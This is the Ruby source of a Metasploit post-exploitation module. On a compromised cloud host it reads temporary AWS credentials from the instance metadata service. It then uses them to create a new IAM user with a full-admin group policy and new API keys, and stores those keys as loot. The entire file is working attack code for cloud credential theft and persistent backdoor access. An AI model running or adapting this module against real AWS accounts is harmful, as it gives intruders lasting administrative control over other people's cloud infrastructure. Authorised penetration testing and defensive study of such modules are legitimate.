require 'msf/core'
require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Post

  include Metasploit::Framework::Aws::Client

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Create an AWS IAM User",
      'Description'    => %q{
        This module will attempt to create an AWS (Amazon Web Services) IAM
        (Identity and Access Management) user with Admin privileges.
      },
      'License'        => MSF_LICENSE,
      'Platform'      => %w(unix),
      'SessionTypes'  => %w(shell meterpreter),
      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>']
    ))

    register_options(
      [
        OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),
        OptString.new('METADATA_PORT', [true, 'The metadata service TCP port', 80]),
        OptString.new('METADATA_SSL', [true, 'Metadata service SSL', false]),
        OptString.new('AWS_IAM_ENDPOINT', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
        OptString.new('AWS_IAM_ENDPOINT_PORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
        OptString.new('AWS_IAM_ENDPOINT_SSL', [true, 'AWS IAM Endpoint SSL', true]),
        OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*" }]}']),
        OptString.new('IAM_USERNAME', [true, 'Username for the user to be created', 'metasploit']),
        OptString.new('ACCESS_KEY', [false, 'AWS access key', '']),
        OptString.new('SECRET', [false, 'AWS secret key', '']),
        OptString.new('TOKEN', [false, 'AWS session token', '']),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ], self.class)
    deregister_options('RHOST', 'RPORT', 'SSL', 'VHOST')
  end


  def run
    # setup creds for making IAM API calls
    c = tmp_creds
    datastore['ACCESS_KEY'] = c.fetch('AccessKeyId', datastore['ACCESS_KEY'])
    datastore['SECRET'] = c.fetch('SecretAccessKey', datastore['SECRET'])
    datastore['TOKEN'] = c.fetch('Token', datastore['TOKEN'])
    datastore['RHOST'] = datastore['AWS_IAM_ENDPOINT']
    datastore['RPORT'] = datastore['AWS_IAM_ENDPOINT_PORT']
    datastore['SSL'] = datastore['AWS_IAM_ENDPOINT_SSL']
    if c['AccessKeyId'].nil? || c['AccessKeyId'].empty?
      print_error("Clould not find creds")
      return
    end

    # create user
    username = datastore['IAM_USERNAME']
    print_status("Creating user: #{username}")
    action = 'CreateUser'
    doc = call_iam('Action' => action, 'UserName' => username)
    print_results(doc, action)

    # create group
    print_status("Creating group: #{username}")
    action = 'CreateGroup'
    doc = call_iam('Action' => action, 'GroupName' => username)
    print_results(doc, action)

    # create group policy
    print_status("Creating group policy: #{username}")
    pol_doc = datastore['IAM_GROUP_POL']
    action = 'PutGroupPolicy'
    doc = call_iam('Action' => action, 'GroupName' => username, 'PolicyName' => username, 'PolicyDocument' => URI.encode(pol_doc))
    print_results(doc, action)

    # add user to group
    print_status("Adding user (#{username}) to group: #{username}")
    action = 'AddUserToGroup'
    doc = call_iam('Action' => action, 'UserName' => username, 'GroupName' => username)
    print_results(doc, action)

    # create API keys
    print_status("Creating API Keys for #{username}")
    action = 'CreateAccessKey'
    doc = call_iam('Action' => action, 'UserName' => username)
    doc = print_results(doc, action)

    return if doc.nil?
    path = store_loot(doc['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
    print_good("API keys stored at: " + path)
  end

  def tmp_creds
    # setup http client required params
    datastore['RHOST'] = datastore['METADATA_IP']
    datastore['RPORT'] = datastore['METADATA_PORT']
    datastore['SSL'] = datastore['METADATA_SSL']
    # call to metadata service should not be proxied, it is always local
    proxies = datastore['Proxies']
    datastore['Proxies'] = nil
    creds = metadata_creds
    datastore['Proxies'] = proxies
    creds
  end
end

